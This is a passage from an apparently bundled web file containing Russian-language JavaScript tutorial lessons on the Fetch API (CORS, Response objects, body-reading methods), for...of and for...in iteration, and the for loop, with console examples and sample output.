~Blob(35635) { size: 35635, type: "image/jpeg" }~^^\n\n^^^\n\n^^^[cors]\n\nРазрешает кросс-доменные запросы\n(![ico-20 warn] если домен, куда направляется запрос, поддерживает CORS)\n\n________________________________________________\n\n![ico-25 cap] ** 4**\n\n^^Например, запрос:^^\n\n~~~js\nconst request = new Request(\'http://bm.img.com.ua/img/prikol/images/large/0/0/307600.jpg\', {\n  mode: \'cors\'\n})\nfetch(request)\n  .then(response => console.log(response))\n~~~\n\n^^![ico-20 error] приведет к генерации исключения:^^\n\n~~~console\nFailed to load http://bm.img.com.ua/img/prikol/images/large/0/0/307600.jpg:\nNo \'Access-Control-Allow-Origin\' header is present on the requested resource\nOrigin \'null\' is therefore not allowed access\nIf an opaque response serves your needs,\nset the request\'s mode to \'no-cors\' to fetch the resource with CORS disabled\n~~~\n\n^^![ico-20 error] и соответствующему "провалу" запроса:^^\n\n~~~console\nUncaught (in promise) TypeError: Failed to fetch\n~~~\n\n^^Это происходит потому, что в режиме **~cors~** требуется, чтобы сервер запрошенного ресурса вернул заголовок **~Access-Control-Allow-Origin~** ^^\n^^со значением, совпадающим со значением **~Origin~** запроса (а заголовок **~Origin~** нельзя подделать, он устанавливается браузером при отправке запроса на сервер).^^\n\n^^Если сервер запрошенного ресурса вернет заголовок **~Access-Control-Allow-Origin~** со значением **~ *~**, то запрос будет выполнен нормально.^^\n\n^^^\n\n![ico-25 cap] ** 5**\n\n~~~js\nvar request = new Request(\'https://httpbin.org/get\', {\n  mode: \'cors\'\n})\n\nfetch(request)\n  .then(response => response.text())\n  .then(response => console.log(response))\n~~~\n\n~~~~console\n{\n  "args": {},\n  "headers": {\n    "Accept": "*/*",\n    "Accept-Encoding": "gzip, deflate, br",\n    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",\n    "Connection": "close",\n    "Host": "httpbin.org",\n    "Origin": "null",\n    "Save-Data": "on",\n    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"\n  },\n  "origin": "185.38.217.69",\n  "url": "https://httpbin.org/get"\n}\n~~~~\n\n______________________________________\n\nКогда объект запроса создается с помощью конструктора **~Request~**, значение свойства ~mode~ для этого запроса устанавливается в _~cors~_\n\n~~~js\nconst request = new Request(\'http://bm.img.com.ua/img/prikol/images/large/0/0/307600.jpg\')\nconsole.log(request.mode) // cors\n~~~\n\nВ противном случае в качестве режима обычно используется **~no-cors~**\n^^( например, когда запрос инициируется из разметки, и атрибут ~crossorigin~ отсутствует )^^\n^^для элементов ~&lt;link>~, ~&lt;script>~, ~&lt;img>~, ~&lt;audio>~, ~&lt;video>~, ~&lt;object>~, ~&lt;embed>~ или ~&lt;iframe>~ запрос выполняется в режиме **~no-cors~**^^\n\n_____________________________________________________\n\n## ![ico-25 icon] Response\n\n| Свойства | объекта Response |\n| **~type~** | ^^строка, информирующая о том, откуда пришел ресурс<br>**basic** - запрос с того же домена<br>**cors** - данные получены с другого домена с использованием CORS-заголовков<br>**opaque** - непрозрачный ответ на запрос другого происхождения, который не возвращает заголовки CORS<br>не позволяет прочитать возвращенные данные или просмотреть статус запроса ( нет возможности проверить успешность запроса )^^ |\n| **~url~** | ^^URL адрес ответа сервера^^ |\n| **~status~** | ^^код статуса ответа сервера^^ |\n| **~statusText~** | ^^текст статуса ответа сервера^^ |\n| **~ok~** | ^^логическое выражение; принимает значение `true`, если получение данных произошло без ошибок ( status от 200 до 299 )^^ |\n| **~bodyUsed~** | ^^логическое выражение; принимает значение `true`, если `body` загружено^^ |\n\n____________________________________________________\n\n### ![ico-20 icon] Заголовки ответа\n\nОбъект **~headers~** ответа сервера имеет ряд унаследованных методов\n\n~~~~Headers\n▼ Headers\n  ▼ __proto__: Headers\n      ► append: ƒ append()\n      ► delete: ƒ delete()\n      ► entries: ƒ entries()\n      ► forEach: ƒ forEach()\n      ► get: ƒ ()\n      ► has: ƒ has()\n      ► keys: ƒ keys()\n      ► set: ƒ ()\n      ► values: ƒ values()\n      ► constructor: ƒ Headers()\n      ► Symbol(Symbol.iterator): ƒ entries()\n        Symbol(Symbol.toStringTag): "Headers"\n      ► __proto__: Object\n~~~~\n\nВоспользуемся методом ~forEach~ для получения значений всех возвращаемых сервером заголовков ответа\n\n___________________________________________\n\n![ico-25 cap] ** 6**\n\nОтправим запрос с методом **HEAD**:\n\n~~~js\nfetch(\'https://api.github.com/users/5\', { method: \'HEAD\'})\n  .then(response => response.headers.forEach(key => console.log(key)))\n~~~\n\n~~~~console\npublic, max-age=60, s-maxage=60\napplication/json; charset=utf-8\nW/"7870416c9818dd4ba65ab505535c7b79"\nFri, 28 Dec 2018 06:04:01 GMT\ngithub.v3; format=json\n60\n53\n1560761075\n~~~~\n\n^^Пока мы не можем посмотреть, как работают методы keys и entries, поскольку оба эти метода возвращают объект итератора, что мы будем изучать позже^^\n______________________________________________________________________\n\n### ![ico-20 icon] Тип ответа\n\nОтвет (Response) имеет свойство **~type~**, которое может иметь значения _~basic~_, _~cors~_ или _~opaque~_\n\nЕсли запрос выполняется в пределах одного домена, то свойство **~type~** ответа будет _~basic~_ (запрос без ограничений)\n\nВ случае кросс-доменного запроса все зависит от ответа\n\nЕсли ответ содержит CORS заголовки, то свойство **~type~** ответа будет _~cors~_\n\nТакой ответ ограничивает доступ к заголовкам - доступны будут только заголовки ^^**_Cache-Control_**^^, ^^**_Content-Language_**^^, ^^**_Content-Type_**^^, ^^**_Expires_**^^, ^^**_Last-Modified_**^^, и ^^**_Pragma_**^^\n\nЕсли значением опции **~mode~** запроса было _~cors~_, но удаленный ресурс не вернул CORS-заголовки, то свойство **~type~** ответа будет _~opaque~_\n\n_____________________________________\n\n### ![ico-20 icon] body\n\nЭто объект _~ReadableStream~_, доступ к которому обеспечивают следующие методы объекта **_~Response~_**:\n\n| ^^Методы^^          | ^^возвращают **_промис_**, результатом которого будет^^ |\n| **~arrayBuffer()~** | ^^объект ArrayBuffer ( строка из нулей и единиц )^^ |\n| **~blob()~**        | ^^объект Blob ( данные в двоичном формате )^^ |\n| **~clone()~**       | ^^копия объекта Response^^ |\n| **~formData()~**    | ^^объект FormData^^> |\n| **~json()~**        | ^^объект, полученный в результате парсинга JSON-строки^^ |\n| **~text()~**        | ^^текст^^ |\n\n________________________________________\n\n#### ![ico-20icon] json()\n\nВоспользуемся [**сервисом**](https://api.2ip.ua) для получения полной информации о пользователе\n^^( в данном случае - о самом себе )^^\n\n^^^[Пример 7]\n\n^^Для получения такой инфо методу  **~fetch~**  нужно передать в качестве аргумента строку^^\n\n~https://api.2ip.ua/geo.json?ip=~\n\n^^Метод  **~fetch~**  вернет промис, поэтому "повесим" обработчика успешного завершения  **~then~**^^\n^^Как мы знаем, метод  **~then~**  принимает один аргумент - функцию, которая будет вызвана в случае успешного завершения асинхронной операции:^^\n\n~~~js\nfetch(\'https://api.2ip.ua/geo.json?ip=\')\n  .then(response => { ... })\n~~~\n\n^^Эта функция получит в качестве аргумента ответ сервера  **_response_** ( так мы назвали эту переменную )^^\n^^Нам не нужен весь объект  **_response_**, который вернет нам метод  **~fetch~**^^\n^^Нам нужен результат ( данные ) в формате  _json_^^\n^^Используем метод   **~json()~** объекта  **~Response~**^^\n^^Мы знаем, что этот метод также вернет промис, т.е. нам нужно еще одного обработчика **~then~**:^^\n\n~~~js\nfetch(\'https://api.2ip.ua/geo.json?ip=\')\n  .then(response => response.json())\n  .then(response => ...)\n~~~\n\n^^Осталось добавить код, который будет выполнен при успешном завершении второго промиса^^\n^^Функция, которую мы передали в качестве аргумента второму **~then~**, получит на входе объект данных, являющийся результатом парсинга json-строки^^\n\n^^^\n\n^^^[Пример 8]\n\n^^Сначала мы получим данные юзера гитхаба, а потом запишем эти данные на _https://httpbin.org_^^\n\n~~~js\nfetch(\'https://api.github.com/users?since=135\')\n  .then(response => response.json())\n  .then(response => fetch(\'https://httpbin.org/post\', {\n    method: \'POST\',\n    credentials: \'include\',\n    headers: new Headers({\n      \'Content-Type\': \'application/json\'\n    }),\n    body: JSON.stringify(response[5])\n  }))\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\n^^^\n\n_____________________________________\n\n#### ![ico-20 icon] blob()\n\n^^Давайте посмотрим, что такое объект Blob^^\n\n![ico-25 cap] ** 9**\n\n^^Создадим элемент ~img~ на странице:^^\n\n~~~js\nconst picture = document.body\n  .appendChild(document.createElement(\'img\'))\n~~~\n\n^^Теперь загрузим с помощью ~fetch~ изображение из сети (например, аватар пользователя github) и итерпретируем ответ сервера как объект Blob:^^\n\n~~~js\nfetch(\'https://avatars2.githubusercontent.com/u/46?v=4\')\n  .then(response => response.blob())\n  .then(blob => Object.assign(picture, {\n    src: URL.createObjectURL(blob),\n    width: 120\n  }))\n~~~\n\n^^Если вывести полученный объект в консоль, то мы увидим:^^\n\n~~~console\n► Blob(35635) { size: 35635, type: "image/jpeg" }\n~~~\n\n^^Изображение получено нами в виде объекта **~Blob~**, и теперь оно является локальным объектом, который нам нужно отобразить на странице в нашем элементе  **_img_**^^\n\n^^Поскольку на странице могут отображаться только объекты (ресурсы), размещенные в сети и имеющие URL, основная задача - создать такой URL для объекта, уже находящегося в нашем распоряжении и являющимся локальным объектом текущей страницы^^\n\n^^Для этого существует метод **URL.createObjectURL**^^\n\n______________________________________________________\n\n#### ![ico-20 icon] arrayBuffer()\n\nЭтот формат ответа сервера представляет собой строку из нулей и единиц\n\nОбъект **ArrayBuffer** не фрагментирует данные, не выделяет отдельные байты или другие кластеры\n\nДля этого у объекта  ArrayBuffer  есть конструкторы:\n\n| ![ico-20 green-ok] Int8Array  | ^^Для представления данных в виде последовательности восьмибитных знаковых целых чисел^^ |\n| ![ico-20 green-ok] Uint8Array | ^^Для представления данных в виде последовательности восьмибитных беззнаковых целых чисел^^ |\n\n^^Результатом работы конструкторов будет **_итерабельный объект_**^^\n\n![ico-25 cap] **10**\n\n~~~js\nfetch(\'https://avatars2.githubusercontent.com/u/46?v=4\')\n  .then(response => response.arrayBuffer())\n  .then(buffer => {\n    console.log(buffer)\n    console.log(new Int8Array(buffer))\n    console.log(new Uint8Array(buffer))\n  })\n~~~\n\n_________________________________________________________\n\n#### ![ico-20 icon] arrayBuffer → blob\n\nМожно получить  объект **~Blob~**  из объекта **~arrayBuffer~** с помощью конструктора  **~Blob~**, которому нужно передать объект **~arrayBuffer~**, "завернутый" в массив\n\n![ico-25 cap] **11**\n\nЗакиньте в консоль следующий код, и посмотрите результат:\n\n~~~~js\nconsole.log(new Blob([\n  \'01101000110000100000011101011010010001000100011101011\'\n]))\n\nconsole.log(new Blob([\n  \'01101000110000100000011101011010010001000100011101011\',\n  \'01101000110000100000011101011010010001000100011101011\'\n]))\n~~~~\n\n![ico-25 cap] **12**\n\nЗакиньте в консоль следующий код:\n\n~~~~js\nfetch(\'https://avatars2.githubusercontent.com/u/46?v=4\')\n  .then(response => response.arrayBuffer())\n  .then(buffer => console.log(new Blob([buffer])))\n~~~~\n\n![ico-25 cap] **13**\n\nЗакиньте в консоль следующий код:\n\n~~~~js\nfetch(\'https://api.github.com/users?since=135\')\n  .then(response => response.json())\n  .then(users => users.map(user => fetch(user.avatar_url)))\n  .then(promises => Promise.all(promises))\n  .then(responses => responses.map(response => response.status === 200 && response.blob()))\n  .then(promises => Promise.all(promises))\n  .then(blobs => blobs.map(blob => URL.createObjectURL(blob)))\n  .then(avatars => avatars.map(avatar => Object.assign(new Image(), { src: avatar })))\n  .then(images => images.forEach(image => document.body.appendChild(image).width = 120))\n~~~~\n\nОбъясните пошагово, что делает этот код.\n\n________________________________________________________________________\n\n\n![ico-25 cap] **14**\n\n~~~js\nfetch(\'https://httpbin.org/get\')\n  .then(response => response.json())\n  .then(response => console.log(response.headers))\n~~~\n\n~~~~headers\n▼ {Accept: "*/*", Accept-Encoding: "gzip, deflate, br", Accept-Language: "en-US,en;q=0.9,ru;q=0.8", Connection: "close", Host: "httpbin.org", …}\n   Accept: "*/*"\n   Accept-Encoding: "gzip, deflate, br"\n   Accept-Language: "en-US,en;q=0.9,ru;q=0.8"\n   Connection: "close"\n   Host: "httpbin.org"\n   Origin: "null"\n   Save-Data: "on"\n   User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"\n ► __proto__: Object\n~~~~\n\n_________________________________________________________\n\n![ico-25 cap] **15**\n\nСделаем кросс-доменный запрос:\n\n~~~~js\nconst request = new Request(\'https://httpbin.org/post\', {\n  method: \'POST\',\n  mode: \'cors\',\n  redirect: \'follow\',\n  headers: new Headers({\n    \'Content-Type\': \'text/plain\'\n  }),\n  body: \'Hello, students!\'\n})\n\nfetch(request)\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~~\n\n**Ответ сервера:**\n\n^^^[Объект Response]\n\n~~~console\n▼ Response {type: "cors", url: "https://httpbin.org/post", redirected: false, status: 200, ok: true, …}\n    body: (...)\n    bodyUsed: true\n  ► headers: Headers {}\n    ok: true\n    redirected: false\n    status: 200\n    statusText: "OK"\n    type: "cors"\n    url: "https://httpbin.org/post"\n  ► __proto__: Response\n~~~\n\n^^^\n\n^^^[распарсенный как json]\n\n~~~console\n▼ {args: {…}, data: "Hello, students!", files: {…}, form: {…}, headers: {…}, …}\n  ► args: {}\n    data: "Hello, students!"\n  ► files: {}\n  ► form: {}\n  ► headers: {Accept: "*/*", Accept-Encoding: "gzip, deflate, br", Accept-Language: "en-US,en;q=0.9,ru;q=0.8", Connection: "close", Content-Length: "16", …}\n    json: null\n    origin: "185.38.217.69"\n    url: "https://httpbin.org/post"\n  ► __proto__: Object\n~~~\n\n^^^\n\n_____________________________________________________________________________________\n\n[![ico-30 hw] **Quiz**](quiz/fetch)\n'},76587:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Итерирование\n\nИтерирование - это последовательный перебор элементов какого-то множества (например, массива).\n\n^^Для массивов и строк это не представляет проблемы, поскольку элементы массива упорядочены и пронумерованы,и последовательность их перебора очевидна^^\n^^(на каждой итерации цикла будет взят следующий по порядку элемент массива, то есть порядковый номер итерации будет совпадать с порядковым номером элемента массива).^^\n^^Символы в строке также расположены последовательно.^^\n^^Однако не все структуры данных упорядочены так, как массивы и строки.^^\n^^Не всегда у элементов множества есть порядковые номера.^^\n\n______________________________\n\n## ![ico-25 icon] Итерабельные структуры данных\n\nДля того, чтобы структуру данных можно было итерировать, у этой структуры данных должен быть определен:\n\n• протокол итерирования, задающий правило выбора очередного элемента из множества;\n• встроенный итератор, реализующий это правило.\n\n^^Итератор будет на каждой итерации возвращать следующий элемент итерируемого множества в соответствии с установленным для этого множества протоколом итерирования^^\n\n____________________________________\n\n## ![ico-25 icon] for...of\n\nОператор цикла  ~for ... of~  итерирует указанную **итерабельную** структуру данных, выполняя заданную в теле оператора последовательность действий над каждым элементом итерируемой совокупности.\n\nОбычные объекты JS не являются итерабельными, поэтому цикл ~for ... of~ не может быть использован с объектом.\n\nНапример, код\n\n~~~js\nvar iteratedObject = {\n  name: 'Begemot',\n  animal: true,\n  age: 3\n}\n\nfor (var item of iteratedObject) {\n  console.log(item)\n}\n~~~\n\nзавершится ошибкой\n\n![ico-20 err]  ~Uncaught TypeError: iteratedObject is not iterable~\n\nОднако существуют итерабельные объекты.\n\nПримером итерабельного (массивоподобного) объекта является объект  ~arguments~.\n\n____________________________________________\n\n### ![ico-25 cap] Array\n\n~~~js\nvar iteratedArray = [10, 20, 30]\n\nfor (var num of iteratedArray) {\n  num /= 10\n  console.log(num)\n}\n~~~\n\n^^На каждой итерации в консоль выводится значение очередного элемента массива ~iteratedArray~, деленное на 10.^^\n\n_________________________\n\n### ![ico-25 cap] String\n\n~~~js\nvar iteratedString = 'ABCDEF'\n\nfor (var char of iteratedString) {\n  console.log(char)\n}\n~~~\n\n^^На каждой итерации в консоль выводится очередносимвол строки *iteratedString*.^^\n\n________________________\n\nЗадача: проверить парность и правильность расстановки скобок в строке\n^^(для упрощения задачи будем считать, что в тестируемой строке только скобки)^^\n\n~~~js\nfunction testBrackets ( string ) {\n  var brackets = {\n    '[': ']',\n    '{': '}',\n    '(': ')'\n  }\n\n  var stack = [], result = ''\n\n  for (var symbol of string) {\n    if (!brackets[symbol] && stack.length === 0) return false\n\n    brackets[symbol]\n      ? stack.push(symbol)\n      : symbol = brackets[stack.pop()]\n\n    result += symbol\n  }\n    return result === string && stack.length === 0\n}\n~~~\n\n________________\n\n### ![ico-25 cap] ~arguments~\n\n~~~js\nfunction showArguments () {\n  for (var arg of arguments) {\n    console.log(arg)\n  }\n}\n\nshowArguments('begemot', false, 3)\n~~~\n\n^^На каждой итерации в консоль выводится очередной элемент итерабельного объекта ~arguments~^^\n\n___________________________\n\n### ![ico-25 icon] ~continue~ | ~break~\n\nЦикл ~for ... of~ может быть прерван\n\nНапример, в результате выполнения кода\n\n~~~js\nvar cities = [\n  'Киев',\n  'Львов',\n  'Харьков',\n  'Одесса',\n  'Монреаль',\n  'Копенгаген',\n  'Вена',\n  'Лондон'\n]\n\nfor (var city of cities) {\n  if (city === 'Копенгаген') continue\n  console.log(city)\n}\n~~~\n\nв консоль бедут выведены элементы\n\n~~~js\nКиев\nЛьвов\nХарьков\nОдесса\nМонреаль\nВена\nЛондон\n~~~\n\nа в результате выполнения кода\n\n~~~js\nfor (var city of cities) {\n  if (city === 'Копенгаген') break\n  console.log(city)\n}\n~~~\n\nв консоль будет выведено\n\n~~~js\nКиев\nЛьвов\nХарьков\nОдесса\nМонреаль\n~~~\n\nТаким образом, с помощью оператора ~continue~ мы прерываем текущую итерацию цикла,\n\nа с помощью оператора ~break~ прерываем выполнение цикла\n\n_____________________\n\n## ![ico-25 icon] for...in\n\nА вот этот оператор как раз делает то, чего не делает оператор ~for...of~\n\nОн итерирует объекты (_точнее, перечислимые свойства объектов_)\n\nДавайте вернемся к примеру, который завершался ошибкой, но теперь вместо оператора ~for...of~  будем использовать оператор ~for...in~\n\n### ![ico-25 cap] Пример\n\n~~~js\nvar iteratedObject = {\n  name: 'Begemot',\n  animal: true,\n  age: 3\n}\n\nfor (var prop in iteratedObject) {\n  console.log(prop)\n}\n~~~\n\nВ консоль будут выведены имена свойств объекта _name_, _animal_ и _age_\n\nЕсли немного подправить код внутри цикла:\n\n~~~js\nfor (var propName in iteratedObject) {\n  console.log(iteratedObject[propName])\n}\n~~~\n\nто мы получим в консоли значения свойств объекта _iteratedObject_:\n\n~~~js\nBegemot, true, 3\n~~~\n\nДавайте выведем в консоль и имя свойства, и значение:\n\n~~~js\nfor (var propName in iteratedObject) {\n    console.log(propName, ' : ',  iteratedObject[propName])\n}\n~~~\n\nТеперь в косоли будет:\n\n~~~js\nname  :  Begemot\nanimal  :  true\nage  :  3\n~~~\n\n_____________________________\n\n### ![ico-20 icon] for...in с массивами\n\nЭлементы массива - это просто перечислимые свойства, имена которых являются целыми числами, а в остальном они идентичны свойствам объекта\n\n^^![ico-20 warn] Однако использование оператора цикла ~for...in~  на массивах не рекомендуется, поскольку нет гарантии, что оператор вернет индексы в нужном порядке^^\n\n### ![ico-25 cap] Пример 1\n\n~~~js\nvar iteratedArray = [7, 8, 9]\n\nfor (var index in iteratedArray) {\n  console.log(index, ' : ', iteratedArray[index])\n}\n~~~\n\n**в консоли:**\n\n~~~js\n0  :  7\n1  :  8\n2  :  9\n~~~\n\n__________________________\n\n### ![ico-20 icon] for...in со строками\n\n~~~js\niteratedString = 'Котенок'\nfor (var index in iteratedString) {\n  console.log(index, ' : ', iteratedString[index])\n}\n~~~\n\n**в консоли:**\n\n~~~js\n0  :  К\n1  :  о\n2  :  т\n3  :  е\n4  :  н\n5  :  о\n6  :  к\n~~~\n\n![ico-20 warn] При переборе свойств объекта с помощью оператора ~for ... in~ имена свойств не обязательно будут перечислены именно в том порядке, в котором заданы\n\n^^По соглашению, если имя свойства – строка, то такие свойства всегда перебираются в том же порядке, в каком присваивались^^\n^^Если имя свойства – число, то браузеры сортируют такие свойства в целях внутренней оптимизации^^\n\n_____________________________________________\n\n### ![ico-25 cap] Пример 2\n\n~~~js\nvar article = {\n  title: 'Canvas',\n  text: 'We will also look into how image smoothing',\n  likes: 0\n}\n\nfor (var prop in article) {\n  console.log(article[prop])\n}\n~~~\n\n^^В консоль будет выведено сначала значение свойства _title_,^^\n^^затем - значение свойства _text_,^^\n^^затем - значение свойства _likes_^^\n\n_______________________________\n\n### ![ico-25 cap] Пример 3\n\n~~~js\nvar obj = {\n  11: 'Canvas',\n  2: 'Now we haven't looked at the actual pixels of our canvas',\n  1: false\n}\n\nfor (var prop in obj) {\n  console.log(obj[prop])\n}\n~~~\n\nВ консоль будет выведено:\n\n~~~js\nfalse\n\nNow we haven't looked at the actual pixels of our canvas\n\nCanvas\n~~~\n\n_________________________________\n\n### ![ico-25 cap] continue\n\nПосмотрим, как действует оператор ~continue~ с циклом ~for...in~\n\n~~~js\nvar obj = {\n  '11': 'Canvas',\n  '01': 'How to save images from your canvas',\n  '05': false\n}\n\nfor (var prop in obj) {\n  if (prop == 1) continue\n  console.log(prop)\n}\n~~~\n\nВ консоль будет выведено\n\n~~~js\n11\n05\n~~~\n\n~continue~ прерывают только текущую итерацию цикла\n\n__________________________\n\n### ![ico-25 cap] break\n\nПри использовании же оператора ~break~\n\n~~~js\nfor (var prop in obj) {\n  if (prop == 1) break\n  console.log(prop)\n}\n~~~\n\nв консоли будет только ~11~\n\nт.е. ~break~ прерывает выполнение цикла, как только доходит до ~prop == 1~ (а это \"01\")\n\n---------------------------------\n\n## ![ico-25 icon] for...of vs for...in\n\nДавайте дальше поиграем с массивом\n\n~~~js\nvar cities = [\n  'Киев',\n  'Львов',\n  'Харьков',\n  'Одесса',\n  'Монреаль',\n  'Копенгаген',\n  'Вена',\n  'Лондон'\n]\n~~~\n\nЭто массив, он итерабелен, и мы можем перебирать его элементы с помощью оператора ~for...of~  так же успешно, как и с помощью оператора  ~for...in~\n\nТак в чем же разница?\n\nВспомним, что у любого массива есть свойство ~length~...\n\nА раз есть свойство, значит, это вроде как ... объект?\n\nДавайте проделаем такой трюк: добавим массиву **cities** свойство **_whereYouLive_**\n\nДобавить свойство проще простого - используем обычный оператор присваивания:\n\n~~~js\ncities.whereYouLive = 'Париж'\n~~~\n\nВыведем массив **cities** в консоль\n\n~~~js\nconsole.log(cities)\n~~~\n\nи увидим:\n\n~~~js\n▼ (8) ['Киев', 'Львов', 'Харьков', 'Одесса', 'Монреаль', 'Копенгаген', 'Вена', 'Лондон', whereYouLive: 'Париж']\n    0: 'Киев'\n    1: 'Львов'\n    2: 'Харьков'\n    3: 'Одесса'\n    4: 'Монреаль'\n    5: 'Копенгаген'\n    6: 'Вена'\n    7: 'Лондон'\n    whereYouLive: 'Париж'\n    length: 8\n  ► __proto__: Array(0)\n~~~\n\nТеперь посмотрим, как будут вести себя операторы ~for...of~ и ~for...in~\n\n**Начнем с оператора ~for...of~**\n\n~~~js\nfor (var city of cities) {\n  console.log(city)\n}\n~~~\n\n**в консоли:**\n\n~~~console\nКиев\nЛьвов\nХарьков\nОдесса\nМонреаль\nКопенгаген\nВена\nЛондон\n~~~\n\n**Теперь используем оператор ~for ... in~**\n\n~~~js\nfor (var index in cities) {\n  console.log(index)\n}\n~~~\n\n**в консоли:**\n\n~~~console\n0\n1\n2\n3\n4\n5\n6\n7\nwhereYouLive\n~~~\n\nСвойство  _~cities.length~_  по-прежнему выдает нам  8\n\nТ.е. по индексу элемента мы можем получить только один из элементов\n\n\"Киев\", \"Львов\", \"Харьков\", \"Одесса\", \"Монреаль\", \"Копенгаген\", \"Вена\", \"Лондон\"...\n\nА как же теперь добраться до _~whereYouLive~_ ?\n\nНам нужно указать не индекс элемента, а имя, под которым мы \"внесли\" этот элемент в массив _cities_:\n\n~~~js\ncities['whereYouLive']\n~~~\n\nвернет нам \"Париж\"\n\n________________\n\n[![ico-30 hw] Quiz](quiz/for-in-for-of)\n"},84607:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Оператор for\n\nНу, вот мы и добрались до третьего основополагающего принципа структурного программирования - до циклов.\nКак мы уже, я надеюсь, знаем, цикл - это повторение одних и тех же действий несколько раз.\nТ.е. есть какой-то код, который должен быть выполнен неоднократно.\nЭтот код помещается в фигурные скобки **~{}~** и называется **телом цикла**.\n\nКаждое повторение цикла называется **итерацией цикла**.\n\nТаким образом, у любого оператора цикла будет тело, и это тело всегда заключено в фигурные скобки.\nНа каждой итерации цикла код внутри фигурных скобок будет исполняться.\n\nНо у каждого цикла есть одна важная задача: во-время остановиться.\nМы же не можем бесконечно повторять выполнение кода в фигурных скобках.\nБесконечный цикл - это подвисание вкладки браузера. Нам это точно ни к чему.\n\nИтак, цикл нужно во-время остановить.\nДля этого определить, когда цикл должен быть остановлен.\n\nЕсть варианты:\n• Прямо указать, сколько раз должен быть выполнен цикл;\n• Задать некое условие, при выполении которого цикл будет повторяться. Такое условие (некое выражение) всегда помещается в круглые скобки.\nУсловие цикла может быть любым вычисляемым выражением (т.е. синтаксически корректным), но после вычисления значения этого выражения движок всегда приведет его к логическому типу (**~true~** или **~false~**).\n\nИтак, у любого оператора цикла есть три обязательные части: **название оператора** (ключевое слово), **условие** в круглых скобках и **тело** в фигурных скобках.\n\nДля оператора цикла **~for~** нужна переменная-счетчик (переменная цикла), которая должна:\n1. иметь стартовое значение. Т.е. ее нужно объявить и присвоить ей начальное значение;\n2. переменная должна менять свое значение после каждой итерации цикла (иначе цикл будет бесконечным);\n3. на каждой итерации значение переменной цикла должно проверяться на предмет выполнения ограничения (иначе цикл будет бесконечным).\n\nМы начинаем наше путешествие по циклам с оператора цикла **~for~**.\n\n## ![ico-30 icon] Syntax\n\nДля оператора цикла **~for~** все, что касается переменной цикла (инициализация, изменение, проверка) помещается в круглые скобки:\n\n~~~js\nfor (initialization; condition; update) {\n  ...body od the loop\n}\n~~~\n\nНапример:\n~~~js\n// initialization:\nvar index = 0\n// condition:\nindex < 10\n// update:\nindex++\n~~~\n\nТогда получаем во такую картину:\n\n~~~js\nfor (var index = 0; index < 10; index++) {\n  ...body of the loop\n}\n~~~\n\nОсталось наполнить тело цикла кодом.\n\n_____________________________________________________________________\n\n## ![ico-30 icon] Директива break\n\nПрерывает выполнение цикла.\n\nДело в том, что ни одна из фаз (initialization; condition; update) для переменной цикла не является обязательной.\nТеоретически можно организовать цикл, в котором все три фазы будут пропущены:\n\n~~~js\nfor (; ;) {\n  console.log('Iteration')\n  if (Math.random() < 0.5) break\n}\n~~~\n\n^^Здесь мы использовали функцию **~random~** встроенной библиотеки <a href=\"#byblyoteka_Math\">**Math**</a>.^^\n\nВ этом случае управление циклом переходит в тело цикла.\nНе очень красивое решение, не так ли?\nУж если вы не хотите возиться с переменной цикла, то лучше использовать оператор цикла **~while~**, который будет рассмотрен далее.\nНо чисто из спортивного интереса такой вариант рассмотреть стоит.\n\nНапример, если нужно вывести в консоль все числа от 1 до 10, то можно сделать так:\n\n~~~js\nfor (var i = 1; ; i++) {\n  if (i > 10) break\n  console.log(i)\n}\n~~~\n\nЗдесь условие на переменную цикла пропущено, что привело бы к бесконечному циклу, если бы мы не поставили прерывание цикла ~break~ внутри его тела.\n\n_____________________________________________________________________\n\n## ![ico-25 icon] Директива continue\n\nПрерывает выполнение текущей итерации цикла.\n\nНапример, если нужно вывести в консоль только четные числа до 10, то можно сделать так:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 === 0) console.log(i)\n}\n~~~\n\nА можно и так:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 !== 0) continue\n  console.log(i)\n}\n~~~\n\n^^Поскольку в теле условного оператора  ~if~  всего одна операция, фигурные скобки мы опустили.^^\n\n^^~ %~ - это операция взятия остатка от деления (~4 % 2~ будет 0, ~5 % 2~ будет 1)^^\n\n^^~x !== y~  значение или тип данных переменной ** x** не совпадает со значением или типом данных переменной ** y**^^\n\n______________________________________________________\n\n## ![ico-30 icon] Examples\n\n◘◘![ico-25 cap]** 1**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 0; i < 10; i++) {\n  res += i * 2\n}\n~~~\n\nРасшифровка выражения в круглых скобках:\n\n~~~js\n(var i = 0; i < 10; i++)\n~~~\n\n| ~var i = 0~ | ^^инициализируем переменную цикла, т.е. объявляем ее и присваиваем ей начальное значение 0^^ |\n| ~i++~ | ^^способ изменения переменной цикла на каждой итерации<br>в данном случае после каждой итерации значение переменной цикла будет увеличиваться на единицу^^ |\n| ~i < 10~ | ^^устанавливаем ограничение на число итераций цикла<br>( значение переменной цикла будет увеличиваться до тех пор, пока оно меньше 10)^^ |\n\n• ^^В данном примере к значению переменной ~res~ 10 раз будет добавлено значение вычисляемого выражения  ~i * 2~^^\n• ^^На первой итерации цикла значением переменной цикла ** i** будет 0, поэтому значение переменной ~res~ не изменится^^\n• ^^После первой итерации значение переменной цикла ** i** будет увеличено на единицу, и станет равно 1^^\n• ^^На второй итерации цикла значение выражения  ~i * 2~ уже будет равно 2, это значение будет добавлено к значению переменной ~res~, которое станет равно 2^^\n• ^^После итерации значение переменной цикла ** i** опять увеличится на 1 и станет равно 2^^\n• ^^На третьей итерации выражение  ~i * 2~ примет значение 4^^\n• ^^Это значение будет добавлено к значению переменной ~res~, которое станет равно ~2 + 4 = 6~^^\n\n^^И так далее...^^\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 2**◘◘\n\n~~~js\nfor (var i = 1; i < 10;) {\n  console.log(i++)\n}\n~~~\n\nВ этом примере приращение переменной цикла осуществляется внутри тела цикла.\nОднако делать так я не 